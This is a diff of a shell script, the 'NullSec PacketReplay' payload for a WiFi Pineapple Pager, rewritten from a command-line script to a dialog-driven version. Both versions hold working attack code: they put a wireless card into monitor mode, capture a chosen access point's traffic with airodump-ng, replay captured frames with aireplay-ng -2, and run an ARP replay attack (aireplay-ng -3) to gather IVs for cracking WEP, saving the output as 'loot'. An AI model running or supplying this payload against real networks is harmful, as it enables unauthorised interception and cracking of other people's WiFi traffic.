@@ -1,145 +1,93 @@
-#!/bin/sh
-#####################################################
-# NullSec PacketReplay Payload
-# Capture and replay interesting packets
-#####################################################
-# Author: NullSec Team
-# Target: WiFi Pineapple Pager
-# Category: Injection/Replay
-#####################################################
+#!/bin/bash
+# Title: Packet Replay
+# Author: NullSec
+# Description: Capture and replay WiFi packets
+# Category: nullsec/attack
 
-PAYLOAD_NAME="PacketReplay"
-source /root/payloads/library/nullsec-lib.sh 2>/dev/null || true
-
-# Configuration
-TARGET_BSSID="${TARGET_BSSID:-$1}"
-TARGET_CHANNEL="${TARGET_CHANNEL:-${2:-6}}"
-MONITOR_INTERFACE="wlan1mon"
-LOOT_DIR="/root/loot/replay"
-LOG_FILE="$LOOT_DIR/replay_$(date +%Y%m%d_%H%M%S).log"
-MODE="${3:-capture}"  # capture, replay, arp
-
+LOOT_DIR="/mmc/nullsec/packetreplay"
 mkdir -p "$LOOT_DIR"
 
-log() {
-    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
-}
+PROMPT "PACKET REPLAY
 
-cleanup() {
-    log "[!] Stopping packet replay..."
-    killall airodump-ng aireplay-ng tcpreplay 2>/dev/null
-    airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null
-    exit 0
-}
+Capture and replay WiFi
+packets for:
 
-trap cleanup INT TERM
+1. Packet capture
+2. Replay attack
+3. ARP replay (WEP)
 
-log "=========================================="
-log "   NullSec PacketReplay v1.0"
-log "=========================================="
+Press OK to configure."
 
-if [ -z "$TARGET_BSSID" ] && [ "$MODE" != "list" ]; then
-    echo "Usage: $0 <target_bssid> [channel] [mode]"
-    echo "Modes: capture, replay, arp, list"
-    echo ""
-    echo "Examples:"
-    echo "  $0 AA:BB:CC:DD:EE:FF 6 capture  - Capture packets"
-    echo "  $0 AA:BB:CC:DD:EE:FF 6 replay   - Replay captured packets"
-    echo "  $0 AA:BB:CC:DD:EE:FF 6 arp      - ARP replay attack"
-    echo "  $0 list                          - List captured packets"
-    exit 1
-fi
+MON_IF=""
+for iface in wlan1mon wlan2mon wlan0mon; do
+    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
+done
+[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }
 
-# Setup monitor mode
-airmon-ng start wlan1 2>/dev/null
-sleep 2
-iwconfig "$MONITOR_INTERFACE" channel "$TARGET_CHANNEL" 2>/dev/null
+PROMPT "MODE:
 
-case "$MODE" in
-    capture)
-        log "[*] Mode: Packet Capture"
-        log "[*] Target: $TARGET_BSSID (Channel $TARGET_CHANNEL)"
-        log "[*] Capturing interesting packets..."
-        
-        CAPTURE_FILE="$LOOT_DIR/capture_${TARGET_BSSID//:/}_$(date +%Y%m%d_%H%M%S)"
-        
-        # Capture with filters for interesting traffic
-        airodump-ng "$MONITOR_INTERFACE" \
-            -c "$TARGET_CHANNEL" \
-            --bssid "$TARGET_BSSID" \
-            --write "$CAPTURE_FILE" \
-            --output-format pcap 2>/dev/null &
-        DUMP_PID=$!
-        
-        log "[*] Capturing... Press Ctrl+C to stop"
-        log "[*] Output: $CAPTURE_FILE"
-        
-        # Also capture with tcpdump for more detail
-        tcpdump -i "$MONITOR_INTERFACE" -w "${CAPTURE_FILE}_detailed.pcap" \
-            "ether host $TARGET_BSSID" 2>/dev/null &
-        
-        wait $DUMP_PID
+1. Capture packets
+2. Replay captured packets
+3. ARP replay attack
+
+Select mode next."
+
+MODE=$(NUMBER_PICKER "Mode (1-3):" 1)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac
+
+TARGET_BSSID=$(MAC_PICKER "Target BSSID:")
+[ -z "$TARGET_BSSID" ] && { ERROR_DIALOG "No BSSID entered!"; exit 1; }
+
+TARGET_CH=$(NUMBER_PICKER "Channel:" 6)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TARGET_CH=6 ;; esac
+
+DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac
+
+resp=$(CONFIRMATION_DIALOG "START PACKET REPLAY?
+
+Mode: $MODE
+Target: $TARGET_BSSID
+Channel: $TARGET_CH
+Duration: ${DURATION}s
+
+Press OK to start.")
+[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
+
+LOG "Packet replay mode $MODE..."
+iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
+
+case $MODE in
+    1)
+        CAP_FILE="$LOOT_DIR/capture_$(date +%Y%m%d_%H%M)"
+        LOG "Capturing packets..."
+        timeout "$DURATION" airodump-ng "$MON_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
+        wait $!
+        PROMPT "CAPTURE COMPLETE
+
+File: ${CAP_FILE}-01.cap
+Press OK to exit."
         ;;
-        
-    replay)
-        log "[*] Mode: Packet Replay"
-        
-        # Find latest capture
+    2)
         LATEST_CAP=$(ls -t "$LOOT_DIR"/*.cap 2>/dev/null | head -1)
-        
-        if [ -z "$LATEST_CAP" ]; then
-            log "[!] No capture files found. Run capture mode first."
-            exit 1
-        fi
-        
-        log "[*] Replaying: $LATEST_CAP"
-        log "[*] Target: $TARGET_BSSID"
-        
-        # Replay packets
-        aireplay-ng -2 -r "$LATEST_CAP" -b "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 | tee -a "$LOG_FILE"
+        [ -z "$LATEST_CAP" ] && { ERROR_DIALOG "No captures found!"; exit 1; }
+        LOG "Replaying: $LATEST_CAP"
+        timeout "$DURATION" aireplay-ng -2 -r "$LATEST_CAP" -b "$TARGET_BSSID" "$MON_IF" 2>/dev/null
+        PROMPT "REPLAY COMPLETE
+
+Replayed: $LATEST_CAP
+Press OK to exit."
         ;;
-        
-    arp)
-        log "[*] Mode: ARP Replay Attack"
-        log "[*] Target: $TARGET_BSSID (Channel $TARGET_CHANNEL)"
-        
-        # Start capture for IVs
-        CAPTURE_FILE="$LOOT_DIR/arp_attack_$(date +%Y%m%d_%H%M%S)"
-        airodump-ng "$MONITOR_INTERFACE" \
-            -c "$TARGET_CHANNEL" \
-            --bssid "$TARGET_BSSID" \
-            --write "$CAPTURE_FILE" \
-            --output-format pcap 2>/dev/null &
-        
+    3)
+        LOG "ARP replay attack..."
+        CAP_FILE="$LOOT_DIR/arp_$(date +%Y%m%d_%H%M)"
+        airodump-ng "$MON_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
         sleep 3
-        
-        log "[*] Starting ARP replay attack..."
-        log "[*] Waiting for ARP packet..."
-        
-        # ARP replay - wait for packet then replay
-        aireplay-ng -3 -b "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 | while read line; do
-            log "$line"
-            if echo "$line" | grep -q "got"; then
-                log "[+] ARP packet captured, replaying..."
-            fi
-        done
-        ;;
-        
-    list)
-        log "[*] Captured packet files:"
-        echo ""
-        ls -lh "$LOOT_DIR"/*.cap "$LOOT_DIR"/*.pcap 2>/dev/null | while read line; do
-            echo "  $line"
-        done
-        echo ""
-        TOTAL=$(ls -1 "$LOOT_DIR"/*.cap "$LOOT_DIR"/*.pcap 2>/dev/null | wc -l)
-        log "[*] Total captures: $TOTAL"
-        ;;
-        
-    *)
-        log "[!] Unknown mode: $MODE"
-        exit 1
+        timeout "$DURATION" aireplay-ng -3 -b "$TARGET_BSSID" "$MON_IF" 2>/dev/null
+        killall airodump-ng 2>/dev/null
+        PROMPT "ARP REPLAY COMPLETE
+
+Capture: ${CAP_FILE}-01.cap
+Press OK to exit."
         ;;
 esac
-
-log "[+] PacketReplay complete"
